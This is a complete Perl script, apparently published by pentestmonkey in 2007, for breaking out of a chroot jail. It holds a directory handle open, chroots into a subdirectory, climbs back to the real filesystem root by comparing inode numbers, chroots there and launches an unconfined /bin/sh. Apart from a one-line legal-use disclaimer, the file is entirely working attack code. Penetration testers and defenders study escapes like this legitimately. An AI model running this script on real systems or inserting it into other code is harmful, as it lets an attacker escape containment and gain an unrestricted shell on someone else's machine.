#!/usr/bin/perl -w
use strict;
# unchroot.pl Dec 2007
# http://pentestmonkey.net/blog/chroot-breakout-perl

# This script may be used for legal purposes only.

# Go to the root of the jail
chdir "/";

# Open filehandle to root of jail
opendir JAILROOT, "." or die "ERROR: Couldn't get file handle to root of jailn";

# Create a subdir, move into it
mkdir "mysubdir";
chdir "mysubdir";

# Lock ourselves in a new jail
chroot ".";

# Use our filehandle to get back to the root of the old jail
chdir(*JAILROOT);

# Get to the real root
while ((stat("."))[0] != (stat(".."))[0] or (stat("."))[1] != (stat(".."))[1]) {
        chdir "..";
}

# Lock ourselves in real root - so we're not really in a jail at all now
chroot ".";

# Start an un-jailed shell
system("/bin/sh");
